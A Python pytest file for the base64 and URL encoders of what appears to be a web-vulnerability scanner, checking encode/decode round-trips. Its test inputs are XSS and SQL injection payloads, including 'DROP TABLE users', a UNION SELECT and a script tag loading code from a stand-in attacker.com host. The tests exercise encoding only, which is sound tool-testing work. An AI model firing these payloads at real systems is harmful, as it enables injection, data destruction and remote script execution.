"""
Tests for core/encoders.py

Tests verify:
- base64 encoding functionality
- URL encoding functionality  
- Encoding toggle behavior (encode/decode)
- Payload transformation correctness
"""

import pytest
import base64 as b64
from core.encoders import base64, url
from urllib.parse import quote, unquote


class TestBase64Encoder:
    """
    Test Suite: base64 encoder function
    
    Verifies: Encoding payloads to base64 format and detecting base64 strings
    """

    def test_encode_plain_string(self):
        """
        Test: Encodes a plain string to base64.
        
        Verifies: Plain text strings are correctly converted to base64 format
        """
        payload = "<img src=x onerror=alert(1)>"
        result = base64(payload)
        expected = b64.b64encode(payload.encode('utf-8')).decode('utf-8')
        assert result == expected
        assert "<" not in result  # Should be encoded

    def test_decode_base64_string(self):
        """
        Test: Decodes a base64 string back to plain text.
        
        Verifies: The encoder automatically detects and decodes base64 input
        """
        original = "<script>alert(1)</script>"
        encoded = b64.b64encode(original.encode('utf-8')).decode('utf-8')
        result = base64(encoded)
        assert result == original

    def test_base64_roundtrip(self):
        """
        Test: Encode then decode returns original string.
        
        Verifies: Encoding is reversible and maintains payload integrity
        """
        original = "v3dm0s' or '1'='1"
        encoded = base64(original)
        decoded = base64(encoded)
        assert decoded == original

    def test_invalid_base64_treated_as_plain(self):
        """
        Test: Invalid base64 strings are encoded as new payloads.
        
        Verifies: Non-base64 strings are treated as plain payloads
        """
        invalid_base64 = "Not@Valid#Base64!!!"
        result = base64(invalid_base64)
        # Should encode it since it's not valid base64
        assert result != invalid_base64


class TestURLEncoder:
    """
    Test Suite: URL encoder function
    
    Verifies: URL encoding payloads for parameter injection
    """

    def test_encode_special_characters(self):
        """
        Test: URL-encodes special characters in payloads.
        
        Verifies: Characters like quotes, brackets, and slashes are properly URL-encoded
        """
        payload = '<img src=x onerror=alert(1)>'
        result = url(payload)
        assert '%' in result  # Should contain encoded characters
        assert '<' not in result
        assert '>' not in result

    def test_encode_space_characters(self):
        """
        Test: URL-encodes space characters.
        
        Verifies: Spaces in payloads are converted to %20 or +
        """
        payload = "alert('XSS Attack')"
        result = url(payload)
        assert ' ' not in result or '%20' in result

    def test_decode_url_encoded_string(self):
        """
        Test: Detects and decodes URL-encoded strings.
        
        Verifies: The encoder automatically detects URL-encoded input and decodes it
        """
        original = "<script>alert(1)</script>"
        encoded = quote(original, safe='~')
        result = url(encoded)
        assert result == original

    def test_already_encoded_not_double_encoded(self):
        """
        Test: Already-encoded strings are not double-encoded.
        
        Verifies: Encoding idempotence prevents double-encoding
        """
        original = "search=<img src=x>"
        encoded_once = url(original)
        encoded_twice = url(encoded_once)
        # Second encoding should decode and re-encode
        assert encoded_once == encoded_twice or url(encoded_twice) == original

    def test_safe_characters_preserved(self):
        """
        Test: Safe characters like ~ are preserved in URL encoding.
        
        Verifies: The encoder preserves commonly safe URL characters
        """
        payload = "test~value"
        result = url(payload)
        assert '~' in result  # Safe character should be preserved


class TestEncodingFallback:
    """
    Test Suite: Encoding fallback behavior
    
    Verifies: Fallback mechanism switches encoding when needed
    """

    def test_fallback_uses_alternate_encoding(self):
        """
        Test: Fallback can switch between encoding types.
        
        Verifies: If one encoding fails, the scanner can try another
        """
        payload = "<svg onload=alert(1)>"
        url_encoded = url(payload)
        b64_encoded = base64(payload)
        
        # Both should produce different results
        assert url_encoded != b64_encoded
        assert url(url_encoded) == payload  # URL is reversible
        assert base64(b64_encoded) == payload  # Base64 is reversible

    def test_encoding_preserves_payload_content(self):
        """
        Test: Encoding preserves the actual payload content.
        
        Verifies: After decode, payload equals original
        """
        payloads = [
            "'; DROP TABLE users; --",
            '"><script src="//attacker.com/xss.js"></script>',
            "1 UNION SELECT NULL,NULL,NULL--",
        ]
        
        for payload in payloads:
            assert url(url(payload)) == payload
            assert base64(base64(payload)) == payload
